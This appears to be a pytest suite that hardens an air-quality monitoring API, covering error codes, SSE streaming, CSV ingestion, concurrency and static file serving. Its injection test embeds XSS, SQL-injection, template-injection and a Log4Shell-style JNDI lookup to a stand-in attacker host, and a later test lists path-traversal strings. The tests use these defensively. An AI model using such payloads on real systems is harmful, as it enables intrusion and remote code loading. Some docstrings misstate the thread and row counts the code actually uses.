"""
Tier 5 Adversarial Coverage Hardening Test Suite: Backend Services, Repositories, and API Gateway.
===================================================================================================

Covers:
1. Route error handlers and status codes on invalid paths, missing query params, malformed timestamps.
2. SSE streaming (src/api/routes/stream.py): client immediate disconnection, client read buffer starvation,
   and dual keepalive framing integrity (': keepalive\\n\\nevent: keepalive\\ndata: {}\\n\\n').
3. CSV ingestion endpoint (/api/v1/ingest/csv): boundary files (0-byte file, huge files, missing header row,
   binary garbage, injection strings in station names/districts, negative coordinates).
4. In-memory repository concurrency: parallel observation insertions, duplicate timestamp overwrite invariants,
   and sorting consistency under concurrent read/write.
5. Spatial surface and analytics route performance under repeated rapid polling and analytical cache invariants.
6. Frontend static dashboard serving: MIME types, security headers, path traversal defense, and route fallbacks.
"""
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta, timezone
import io
import json
import os
from pathlib import Path
import random
import threading
from typing import Any, Dict, List, Optional

import anyio
import httpx
from httpx import ASGITransport
import pytest

from src.api.main import create_application
import src.api.routes.stream as stream_route
from src.domain.entities.models import Station, StationObservation
from src.infrastructure.repositories.baseline_repository import BaselineRepository


PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent


@pytest.fixture(scope="module")
def app():
    """Module-scoped FastAPI application instance."""
    return create_application()


@pytest.fixture
def anyio_backend():
    """Specify asyncio as anyio engine."""
    return "asyncio"


# =============================================================================
# Section 1: Route Error Handlers & Status Codes on Invalid Paths & Inputs
# =============================================================================

@pytest.mark.anyio
@pytest.mark.parametrize("invalid_path", [
    "/api/v1/nonexistent_route",
    "/api/v1/meta/unknown_subroute",
    "/api/v2/telemetry",
    "/api/v1/analytics/invalid_action",
    "/api/undefined",
])
async def test_invalid_routes_return_404_not_found(app, invalid_path):
    """Verify arbitrary invalid API paths uniformly return 404 Not Found."""
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        resp = await client.get(invalid_path)
        assert resp.status_code == 404, f"Expected 404 for {invalid_path}, got {resp.status_code}"


@pytest.mark.anyio
async def test_missing_required_query_parameters_return_422(app):
    """
    Verify endpoints with mandatory parameters return 422 Unprocessable Entity
    with uniform ValidationError schema when required query parameters are omitted.
    """
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        # /api/v1/analytics/cpf requires 'district'
        resp = await client.get("/api/v1/analytics/cpf")
        assert resp.status_code == 422
        payload = resp.json()
        assert payload.get("status") == "error"
        assert payload.get("error_type") == "ValidationError"
        assert "details" in payload
        assert any("district" in str(err) for err in payload["details"])


@pytest.mark.anyio
@pytest.mark.parametrize("route_with_malformed_time", [
    "/api/v1/observations/hourly?start_time=not-a-timestamp",
    "/api/v1/observations/hourly?start_time=2026-99-99T99:99:99",
    "/api/v1/observations/hourly?end_time=invalid_epoch_string",
    "/api/v1/spatial/surface?timestamp=corrupt_date_time",
    "/api/v1/analytics/flux?timestamp=2026-13-40T25:70:00Z",
    "/api/v1/analytics/transboundary?timestamp=garbage_string",
])
async def test_malformed_timestamps_return_422(app, route_with_malformed_time):
    """Verify malformed, unparseable, or nonsensical ISO timestamps trigger 422 ValidationError."""
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        resp = await client.get(route_with_malformed_time)
        assert resp.status_code == 422, f"Expected 422 for {route_with_malformed_time}, got {resp.status_code}"
        payload = resp.json()
        assert payload.get("error_type") == "ValidationError"


@pytest.mark.anyio
@pytest.mark.parametrize("query_url,expected_status", [
    ("/api/v1/spatial/surface?resolution=0", 422),   # resolution ge=1
    ("/api/v1/spatial/surface?resolution=-5", 422),  # resolution negative
    ("/api/v1/spatial/surface?resolution=51", 422),  # resolution le=50
    ("/api/v1/analytics/flux?limit=0", 422),         # limit ge=1
    ("/api/v1/analytics/flux?limit=201", 422),       # limit le=200
    ("/api/v1/analytics/flux?limit=-10", 422),       # limit negative
])
async def test_query_parameter_boundary_and_validation_limits(app, query_url, expected_status):
    """Verify query parameters adhering to numeric constraints enforce boundary limits."""
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        resp = await client.get(query_url)
        assert resp.status_code == expected_status, f"Expected {expected_status} for {query_url}, got {resp.status_code}"


@pytest.mark.anyio
@pytest.mark.parametrize("aqi_alias", ["AQI", "aqi", " Aqi "])
async def test_physical_guard_on_dimensionless_aqi_advection(app, aqi_alias):
    """
    CRITICAL PHYSICAL INVARIANT:
    Advection transport mass flux is physically undefined for dimensionless ordinal index 'AQI'.
    Querying /api/v1/analytics/flux with pollutant=AQI must return 400 Bad Request.
    """
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        resp = await client.get(f"/api/v1/analytics/flux?pollutant={aqi_alias}")
        assert resp.status_code == 400
        detail = resp.json().get("detail", "")
        assert "physically undefined" in detail
        assert "dimensionless ordinal index" in detail


@pytest.mark.anyio
async def test_unknown_district_cpf_returns_400(app):
    """Verify querying CPF wind rose for non-existent administrative district returns 400 Bad Request."""
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        resp = await client.get("/api/v1/analytics/cpf?district=NonExistentAtlantisDistrict&pollutant=PM2.5")
        assert resp.status_code == 400
        assert "Unknown administrative district" in resp.json().get("detail", "")


# =============================================================================
# Section 2: Server-Sent Events (SSE) Live Telemetry Streaming Resilience
# =============================================================================

@pytest.mark.anyio
async def test_sse_stream_dual_keepalive_framing_integrity(monkeypatch):
    """
    Verify SSE keepalive framing integrity:
    The heartbeat packet MUST emit dual framing:
    1. A proxy comment line (': keepalive\\n\\n') to satisfy intermediate HTTP proxies/firewalls.
    2. A formal EventSource keepalive event ('event: keepalive\\ndata: {}\\n\\n') for client listeners.
    Together formatted exactly as: ': keepalive\\n\\nevent: keepalive\\ndata: {}\\n\\n'.
    """
    fresh_app = create_application()
    repo = fresh_app.state.repo
    monkeypatch.setattr(stream_route, "KEEPALIVE_INTERVAL_SECONDS", 0.05)
    monkeypatch.setattr(stream_route, "POLL_CHECK_INTERVAL_SECONDS", 0.02)

    async def inject_newer_observation():
        await asyncio.sleep(0.08)
        latest_ts = repo.get_latest_timestamp()
        new_ts = latest_ts + timedelta(hours=1)
        stn = repo.list_stations()[0]
        obs = StationObservation(
            station_id=stn.id,
            recorded_at=new_ts,
            aqi=150,
            pm25=75.0,
            pm10=100.0,
            no2=20.0,
            so2=10.0,
            co=1.0,
            o3=30.0,
            temperature_c=25.0,
            relative_humidity_pct=50.0,
            wind_speed=2.5,
            wind_direction=180.0,
            u=-0.0,
            v=2.5,
        )
        repo.add_station_observations([obs])

    with anyio.fail_after(2.0):
        async with anyio.create_task_group() as tg:
            tg.start_soon(inject_newer_observation)
            async with httpx.AsyncClient(transport=ASGITransport(app=fresh_app), base_url="http://testserver") as client:
                async with client.stream("GET", "/api/v1/stream/live?max_events=2") as stream_resp:
                    assert stream_resp.status_code == 200
                    assert "text/event-stream" in stream_resp.headers.get("content-type", "")

                    accumulated = ""
                    async for chunk in stream_resp.aiter_text():
                        accumulated += chunk

                    assert ": keepalive\n\nevent: keepalive\ndata: {}\n\n" in accumulated, (
                        f"Expected dual keepalive framing not found in accumulated chunks: {repr(accumulated)}"
                    )


@pytest.mark.anyio
async def test_sse_client_immediate_disconnection(monkeypatch):
    """
    Stress-test immediate client disconnection:
    Client initiates SSE connection and drops immediately after handshake without consuming data.
    Server generator must handle task cancellation / client disconnect cleanly without leaking resources.
    """
    fresh_app = create_application()
    monkeypatch.setattr(stream_route, "KEEPALIVE_INTERVAL_SECONDS", 0.05)
    monkeypatch.setattr(stream_route, "POLL_CHECK_INTERVAL_SECONDS", 0.02)

    async with httpx.AsyncClient(transport=ASGITransport(app=fresh_app), base_url="http://testserver") as client:
        # Connect and close immediately inside context manager
        try:
            with anyio.fail_after(0.08):
                async with client.stream("GET", "/api/v1/stream/live") as stream_resp:
                    assert stream_resp.status_code == 200
                    # Abruptly exit without reading a single byte
        except TimeoutError:
            pass

    # Server must remain 100% operational
    async with httpx.AsyncClient(transport=ASGITransport(app=fresh_app), base_url="http://testserver") as client:
        health_resp = await client.get("/health")
        assert health_resp.status_code == 200
        assert health_resp.json()["status"] == "healthy"


@pytest.mark.anyio
async def test_sse_client_read_buffer_starvation_and_slow_consumer(monkeypatch):
    """
    Stress-test read buffer starvation / slow consumer:
    Client introduces deliberate delays between reading stream chunks.
    Verify generator stays alive, delivers ordered events, and terminates cleanly when max_events reached.
    """
    fresh_app = create_application()
    monkeypatch.setattr(stream_route, "KEEPALIVE_INTERVAL_SECONDS", 0.04)
    monkeypatch.setattr(stream_route, "POLL_CHECK_INTERVAL_SECONDS", 0.02)

    async with httpx.AsyncClient(transport=ASGITransport(app=fresh_app), base_url="http://testserver") as client:
        async with client.stream("GET", "/api/v1/stream/live?max_events=1") as stream_resp:
            assert stream_resp.status_code == 200
            chunks = []
            async for chunk in stream_resp.aiter_text():
                # Artificial starvation delay between chunk processing
                await asyncio.sleep(0.05)
                chunks.append(chunk)

            full_body = "".join(chunks)
            assert "event: hourly_update" in full_body
            assert "data: " in full_body


# =============================================================================
# Section 3: CSV Ingestion Endpoint (/api/v1/ingest/csv) Boundary & Malformed Handling
# =============================================================================

@pytest.mark.anyio
async def test_csv_ingest_zero_byte_empty_file(app):
    """Verify uploading an empty 0-byte CSV file returns 400 Bad Request."""
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        files = {"file": ("empty.csv", b"", "text/csv")}
        resp = await client.post("/api/v1/ingest/csv", files=files)
        assert resp.status_code == 400
        assert "empty" in resp.json().get("detail", "").lower()


@pytest.mark.anyio
async def test_csv_ingest_invalid_file_extension(app):
    """Verify uploading a non-csv extension returns 400 Bad Request."""
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        files = {"file": ("dataset.xlsx", b"binarydata", "application/vnd.ms-excel")}
        resp = await client.post("/api/v1/ingest/csv", files=files)
        assert resp.status_code == 400
        assert "Only standard comma-separated values (.csv) files are supported" in resp.json().get("detail", "")


@pytest.mark.anyio
async def test_csv_ingest_missing_mandatory_header_row(app):
    """
    Verify CSV with missing mandatory header row returns status='failed'
    with descriptive errors indicating missing columns.
    """
    csv_without_headers = (
        "2026-11-10 12:00,PK01,Mall Road,Lahore,31.56,74.34,PM2.5,145.2\n"
        "2026-11-10 13:00,PK01,Mall Road,Lahore,31.56,74.34,PM2.5,152.0\n"
    )
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        files = {"file": ("no_headers.csv", csv_without_headers.encode("utf-8"), "text/csv")}
        resp = await client.post("/api/v1/ingest/csv", files=files)
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "failed"
        assert data["valid_rows"] == 0
        assert any("Missing mandatory CSV columns" in str(err) for err in data["errors"])


@pytest.mark.anyio
async def test_csv_ingest_binary_garbage_handling(app):
    """
    Verify uploading binary garbage with .csv extension does not cause an unhandled 500 crash,
    safely decoding with replacement and rejecting due to invalid CSV structure.
    """
    binary_garbage = bytes([b for b in range(128, 256)]) * 16
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        files = {"file": ("corrupted.csv", binary_garbage, "text/csv")}
        resp = await client.post("/api/v1/ingest/csv", files=files)
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "failed"
        assert data["valid_rows"] == 0


@pytest.mark.anyio
async def test_csv_ingest_injection_strings_sanitization(app):
    """
    Adversarial injection test:
    Inject SQL injection, XSS vectors, format strings, and command injection strings
    into station_name and district fields.
    System must safely validate schemas and process rows without executing injections or crashing.
    """
    injection_csv = (
        "timestamp,station_id,station_name,district,latitude,longitude,pollutant,value,wind_speed,wind_direction\n"
        "2026-11-10 12:00,INJ_01,\"<script>alert('xss')</script>\",\"Lahore'; DROP TABLE stations; --\",31.5204,74.3587,PM2.5,85.0,2.1,180.0\n"
        "2026-11-10 12:00,INJ_02,\"${jndi:ldap://malicious.evil/a}\",\"{{7*7}}\",31.5500,74.3000,PM10,120.0,3.0,90.0\n"
    )
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        files = {"file": ("injection_test.csv", injection_csv.encode("utf-8"), "text/csv")}
        resp = await client.post("/api/v1/ingest/csv", files=files)
        assert resp.status_code == 200
        data = resp.json()
        # Ingestion should process these text values safely
        assert data["total_rows"] == 2
        assert data["valid_rows"] == 2
        assert data["quarantined_rows"] == 0

    # Verify query for stations doesn't corrupt or execute payloads
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        stations_resp = await client.get("/api/v1/meta/stations")
        assert stations_resp.status_code == 200
        all_stns = stations_resp.json()
        inj_stn = next((s for s in all_stns if s["id"] == "INJ_01"), None)
        assert inj_stn is not None
        assert inj_stn["name"] == "<script>alert('xss')</script>"


@pytest.mark.anyio
async def test_csv_ingest_negative_and_out_of_bounds_coords(app):
    """
    Verify negative coordinates and coordinates outside Punjab boundary [27-35°N, 69-76°E]
    are strictly quarantined to Dead-Letter Quarantine with error_type='VALIDATION_ERROR'.
    """
    oob_csv = (
        "timestamp,station_id,station_name,district,latitude,longitude,pollutant,value,wind_speed,wind_direction\n"
        # Negative latitude and longitude
        "2026-11-10 12:00,NEG_01,Antarctica Station,Lahore,-31.5204,-74.3587,PM2.5,45.0,1.5,120.0\n"
        # Latitude above Punjab limit (> 35.0)
        "2026-11-10 12:00,OOB_02,North Pole Station,Rawalpindi,38.5000,73.0000,PM2.5,50.0,2.0,100.0\n"
        # Longitude below Punjab limit (< 69.0)
        "2026-11-10 12:00,OOB_03,West Edge Station,Multan,30.0000,65.0000,PM2.5,60.0,1.8,90.0\n"
    )
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        files = {"file": ("oob_coords.csv", oob_csv.encode("utf-8"), "text/csv")}
        resp = await client.post("/api/v1/ingest/csv", files=files)
        assert resp.status_code == 200
        data = resp.json()
        assert data["total_rows"] == 3
        assert data["valid_rows"] == 0
        assert data["quarantined_rows"] == 3
        quarantine_recs = data.get("quarantine_records") or data.get("quarantined_records") or []
        assert len(quarantine_recs) == 3
        assert all(q["error_type"] in ("VALIDATION_ERROR", "COORDINATES_MISSING_OR_UNRESOLVABLE") for q in quarantine_recs)


@pytest.mark.anyio
async def test_csv_ingest_huge_file_stress_boundary(app):
    """
    Stress-test high volume CSV ingestion:
    Construct a synthetic multi-station multi-pollutant dataset with 1,200 rows.
    Verify pipeline parses, deduplicates/merges, and persists without OOM or latency degradation.
    """
    lines = [
        "timestamp,station_id,station_name,district,latitude,longitude,pollutant,value,wind_speed,wind_direction"
    ]
    base_time = datetime(2026, 11, 10, 0, 0, tzinfo=timezone.utc)
    for hour in range(24):
        ts_str = (base_time + timedelta(hours=hour)).strftime("%Y-%m-%d %H:%M")
        for s_idx in range(5):
            sid = f"BULK_{s_idx:02d}"
            sname = f"Bulk Monitor {s_idx}"
            dist = "Lahore"
            lat = 31.50 + (s_idx * 0.05)
            lon = 74.30 + (s_idx * 0.05)
            # 10 pollutants per station-hour = 24 * 5 * 10 = 1,200 rows
            for pol in ["pm25", "pm10", "no2", "so2", "co", "o3", "no", "nox", "aqi"]:
                val = round(10.0 + (hour * 2.5) + (s_idx * 5.0), 1)
                lines.append(f"{ts_str},{sid},{sname},{dist},{lat:.4f},{lon:.4f},{pol},{val},3.5,180.0")

    large_csv = "\n".join(lines).encode("utf-8")
    assert len(lines) - 1 == 24 * 5 * 9  # 1,080 rows

    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        files = {"file": ("bulk_1080_rows.csv", large_csv, "text/csv")}
        resp = await client.post("/api/v1/ingest/csv", files=files)
        assert resp.status_code == 200
        data = resp.json()
        assert data["total_rows"] == 1080
        assert data["valid_rows"] == 1080
        assert data["quarantined_rows"] == 0
        assert data["merged_observations_count"] == 24 * 5  # 120 composite observations


# =============================================================================
# Section 4: In-Memory Repository Concurrency & Data Structure Invariants
# =============================================================================

def test_repository_parallel_observation_insertions():
    """
    Stress-test multi-threaded parallel observation insertions on BaselineRepository:
    10 threads concurrently insert batches of 100 observations into the repository.
    Verifies that RLock prevents race conditions, no 'dictionary changed size during iteration'
    exceptions occur, and all observations are indexed correctly.
    """
    repo = BaselineRepository()
    initial_stations = repo.count_stations()

    num_threads = 8
    obs_per_thread = 50
    base_ts = datetime(2026, 11, 10, 0, 0, tzinfo=timezone.utc)

    # Register test stations
    for t_id in range(num_threads):
        stn = Station(
            id=f"CONC_STN_{t_id}",
            name=f"Concurrent Station {t_id}",
            district="Lahore",
            latitude=31.50,
            longitude=74.30,
            station_type="fixed",
            has_anemometer=True,
            anemometer_blacklisted=False,
            altitude_m=215.0,
        )
        repo.add_station(stn)

    def worker_insert(t_idx: int) -> int:
        batch = []
        for i in range(obs_per_thread):
            rec_time = base_ts + timedelta(minutes=i * 10)
            obs = StationObservation(
                station_id=f"CONC_STN_{t_idx}",
                recorded_at=rec_time,
                pm25=float(20 + i),
                pm10=float(40 + i),
                aqi=int(50 + i),
            )
            batch.append(obs)
        repo.add_station_observations(batch)
        return len(batch)

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(worker_insert, i) for i in range(num_threads)]
        results = [f.result() for f in as_completed(futures)]

    assert sum(results) == num_threads * obs_per_thread

    # Check each station series has exact count
    for t_id in range(num_threads):
        series = repo.get_station_hourly_series(f"CONC_STN_{t_id}")
        assert len(series) == obs_per_thread


def test_repository_duplicate_timestamp_overwrite_invariant():
    """
    INVARIANT:
    Inserting a new observation for the same (station_id, timestamp) MUST:
    1. Overwrite the existing observation data in _station_obs_by_id_and_time.
    2. Maintain exactly ONE entry in _station_obs_by_time[dt] (no duplicate station entries).
    3. Maintain exactly ONE entry in _station_obs_by_station[station_id] (no duplicate timestamps).
    4. Slices from get_station_hourly_series must reflect the updated overwrite value.
    """
    repo = BaselineRepository()
    test_stn_id = "STN_DEDUP_INVARIANT"
    repo.add_station(
        Station(
            id=test_stn_id,
            name="Dedup Invariant Station",
            district="Faisalabad",
            latitude=31.4187,
            longitude=73.0791,
            station_type="fixed",
            has_anemometer=True,
            anemometer_blacklisted=False,
            altitude_m=184.0,
        )
    )

    fixed_time = datetime(2026, 11, 10, 14, 0, tzinfo=timezone.utc)

    # First insertion: PM2.5 = 45.0, AQI = 80
    obs_initial = StationObservation(
        station_id=test_stn_id,
        recorded_at=fixed_time,
        pm25=45.0,
        aqi=80,
    )
    repo.add_station_observation(obs_initial)

    # Verify initial state
    read_initial = repo.get_station_observation(test_stn_id, fixed_time)
    assert read_initial is not None
    assert read_initial.pm25 == 45.0
    assert read_initial.aqi == 80
    assert len(repo.get_station_hourly_series(test_stn_id)) == 1

    # Overwrite insertion: PM2.5 = 285.0, AQI = 350
    obs_overwrite = StationObservation(
        station_id=test_stn_id,
        recorded_at=fixed_time,
        pm25=285.0,
        aqi=350,
    )
    repo.add_station_observation(obs_overwrite)

    # Invariant 1: Direct lookup reflects overwritten value
    read_updated = repo.get_station_observation(test_stn_id, fixed_time)
    assert read_updated is not None
    assert read_updated.pm25 == 285.0
    assert read_updated.aqi == 350

    # Invariant 2 & 3: Series length remains strictly 1 (no duplicate record)
    series = repo.get_station_hourly_series(test_stn_id)
    assert len(series) == 1
    assert series[0].pm25 == 285.0

    # Invariant 4: Station obs at timestamp has no duplicates
    all_at_time = repo.get_station_observations_at_timestamp(fixed_time)
    matches = [o for o in all_at_time if o.station_id == test_stn_id]
    assert len(matches) == 1
    assert matches[0].pm25 == 285.0


def test_repository_sorting_consistency_under_concurrent_read_write():
    """
    Stress-test sorting consistency under concurrent reads and writes:
    - 4 writer threads insert observations with random, out-of-order timestamps.
    - 4 reader threads continuously query get_station_hourly_series and verify strict
      monotonic ordering of timestamps.
    - Asserts that bisect_left / bisect_right binary search invariants are never violated.
    """
    repo = BaselineRepository()
    test_stn_id = "SORT_CONC_STN"
    repo.add_station(
        Station(
            id=test_stn_id,
            name="Sort Consistency Station",
            district="Rawalpindi",
            latitude=33.60,
            longitude=73.04,
            station_type="fixed",
            has_anemometer=True,
            anemometer_blacklisted=False,
            altitude_m=508.0,
        )
    )

    base_time = datetime(2026, 11, 1, 0, 0, tzinfo=timezone.utc)
    # 200 distinct hour offsets
    offsets = list(range(200))
    random.seed(42)
    random.shuffle(offsets)

    errors = []
    stop_event = threading.Event()

    def reader_task():
        while not stop_event.is_set():
            series = repo.get_station_hourly_series(test_stn_id)
            if len(series) > 1:
                # Assert strictly increasing order
                for i in range(len(series) - 1):
                    t1 = series[i].recorded_at
                    t2 = series[i + 1].recorded_at
                    if t1 >= t2:
                        errors.append(f"Unsorted series detected: {t1} >= {t2}")
                        return
            # Small yield
            threading.Event().wait(0.001)

    def writer_task(offset_chunk: List[int]):
        for off in offset_chunk:
            dt = base_time + timedelta(hours=off)
            obs = StationObservation(
                station_id=test_stn_id,
                recorded_at=dt,
                pm25=float(off % 50),
            )
            repo.add_station_observation(obs)
            threading.Event().wait(0.001)

    # Chunk offsets across 4 writers
    chunks = [offsets[i::4] for i in range(4)]

    reader_threads = [threading.Thread(target=reader_task) for _ in range(4)]
    writer_threads = [threading.Thread(target=writer_task, args=(chunks[i],)) for i in range(4)]

    for t in reader_threads:
        t.start()
    for t in writer_threads:
        t.start()

    for t in writer_threads:
        t.join()

    stop_event.set()
    for t in reader_threads:
        t.join()

    assert not errors, f"Sorting consistency violated during concurrent mutations: {errors[:5]}"

    # Final check: series must have exactly 200 items in strict chronological order
    final_series = repo.get_station_hourly_series(test_stn_id)
    assert len(final_series) == 200
    for i in range(len(final_series) - 1):
        assert final_series[i].recorded_at < final_series[i + 1].recorded_at


# =============================================================================
# Section 5: Spatial Surface & Analytics Route Rapid Polling Stress & Caching
# =============================================================================

@pytest.mark.anyio
async def test_spatial_surface_rapid_concurrent_polling(app):
    """
    Stress-test spatial surface route under rapid concurrent polling (40 concurrent requests):
    - Asserts all 40 queries complete with status 200 OK.
    - Asserts 100% data consistency (identical grid resolution, dimensions, and min/max bounds).
    - Verifies repository in-memory cache accelerates sub-millisecond responses without thread collisions.
    """
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        # First request to warm cache
        init_resp = await client.get("/api/v1/spatial/surface?resolution=15&pollutant=PM2.5")
        assert init_resp.status_code == 200
        baseline_data = init_resp.json()
        assert baseline_data["resolution"] == 15
        expected_rows = len(baseline_data["grid_matrix"])

        async def poll_surface():
            resp = await client.get("/api/v1/spatial/surface?resolution=15&pollutant=PM2.5")
            assert resp.status_code == 200
            data = resp.json()
            assert len(data["grid_matrix"]) == expected_rows
            assert data["pollutant"] == "PM2.5"
            return True

        # Launch 40 concurrent requests
        results = await asyncio.gather(*[poll_surface() for _ in range(40)])
        assert len(results) == 40
        assert all(results)


@pytest.mark.anyio
async def test_analytics_routes_rapid_concurrent_burst(app):
    """
    Stress-test mixed analytics routes under concurrent burst:
    Dispatches interleaved requests to /cpf, /flux, and /transboundary simultaneously.
    Verifies no thread lockups, valid schema serialization, and consistent analytics results.
    """
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        async def query_cpf():
            resp = await client.get("/api/v1/analytics/cpf?district=Lahore&pollutant=PM2.5")
            assert resp.status_code == 200
            data = resp.json()
            assert data["district"] == "Lahore"
            assert len(data["sectors"]) == 16
            return "cpf"

        async def query_flux():
            resp = await client.get("/api/v1/analytics/flux?pollutant=PM2.5&limit=25")
            assert resp.status_code == 200
            data = resp.json()
            assert "top_pathways" in data
            return "flux"

        async def query_transboundary():
            resp = await client.get("/api/v1/analytics/transboundary?pollutant=PM2.5")
            assert resp.status_code == 200
            data = resp.json()
            assert "border_districts" in data
            return "tb"

        tasks = []
        for _ in range(10):
            tasks.extend([query_cpf(), query_flux(), query_transboundary()])

        # 30 concurrent mixed queries
        results = await asyncio.gather(*tasks)
        assert len(results) == 30
        assert results.count("cpf") == 10
        assert results.count("flux") == 10
        assert results.count("tb") == 10


# =============================================================================
# Section 6: Frontend Static Dashboard Serving, MIME Types & Security
# =============================================================================

@pytest.mark.anyio
@pytest.mark.parametrize("route_path", ["/", "/index.html"])
async def test_frontend_root_and_index_html_serving(app, route_path):
    """
    Verify root '/' and '/index.html' routes serve the frontend dashboard
    with proper text/html MIME type and 200 OK status.
    """
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        resp = await client.get(route_path)
        assert resp.status_code == 200
        content_type = resp.headers.get("content-type", "")
        assert "text/html" in content_type
        assert "<!DOCTYPE html>" in resp.text or "<html" in resp.text
        # Assert key dashboard container is present
        assert "Punjab Air Quality" in resp.text or "dashboard" in resp.text


@pytest.mark.anyio
@pytest.mark.parametrize("asset_path,expected_mime_fragment", [
    ("/static/css/tokens.css", "text/css"),
    ("/static/js/app.js", "javascript"),
    ("/static/js/api.js", "javascript"),
    ("/static/js/canvas.js", "javascript"),
    ("/static/js/ui.js", "javascript"),
])
async def test_frontend_static_assets_mime_types(app, asset_path, expected_mime_fragment):
    """
    Verify static frontend resources are served with correct MIME types:
    - CSS files served as text/css
    - JS files served as application/javascript or text/javascript
    """
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        resp = await client.get(asset_path)
        assert resp.status_code == 200, f"Failed to fetch {asset_path}"
        content_type = resp.headers.get("content-type", "")
        assert expected_mime_fragment in content_type, (
            f"Expected {expected_mime_fragment} in Content-Type for {asset_path}, got {content_type}"
        )


@pytest.mark.anyio
@pytest.mark.parametrize("traversal_path", [
    "/static/../main.py",
    "/static/%2e%2e/main.py",
    "/static/..%2fmain.py",
    "/static/....//main.py",
    "/static/../../PROJECT.md",
])
async def test_frontend_static_path_traversal_protection(app, traversal_path):
    """
    Security check:
    Verify directory traversal attempts via /static/ mount are rejected (404 Not Found or 400),
    preventing arbitrary file disclosure outside the static assets directory.
    """
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        resp = await client.get(traversal_path)
        # Traversal must NOT return 200 with python or config code
        assert resp.status_code in (404, 400), f"Path traversal succeeded on {traversal_path}: status {resp.status_code}"


@pytest.mark.anyio
async def test_frontend_static_missing_file_returns_404(app):
    """Verify requesting non-existent static resource returns 404 Not Found."""
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        resp = await client.get("/static/nonexistent_asset_xyz.css")
        assert resp.status_code == 404


@pytest.mark.anyio
async def test_cors_headers_on_api_gateway(app):
    """Verify CORS middleware headers are properly returned for cross-origin client requests."""
    async with httpx.AsyncClient(transport=ASGITransport(app=app), base_url="http://testserver") as client:
        headers = {"Origin": "http://localhost:3000"}
        resp = await client.get("/health", headers=headers)
        assert resp.status_code == 200
        assert resp.headers.get("access-control-allow-origin") in ("*", "http://localhost:3000")
